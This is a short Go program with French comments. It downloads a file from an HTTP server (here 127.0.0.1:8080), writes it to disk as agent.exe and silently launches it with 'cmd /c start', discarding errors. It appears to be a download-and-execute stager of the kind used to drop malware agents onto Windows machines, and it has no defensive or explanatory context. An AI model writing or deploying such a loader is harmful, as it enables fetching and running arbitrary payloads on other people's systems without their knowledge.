package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
)

func main() {
	// Télécharger l'agent
	resp, err := http.Get("http://127.0.0.1:8080/update.dat")
	if err != nil {
		return
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	// Sauvegarder
	os.WriteFile("agent.exe", data, 0755)

	// Exécuter via cmd /c start (fonctionne toujours)
	cmd := exec.Command("cmd", "/c", "start", "agent.exe")
	cmd.Start()
}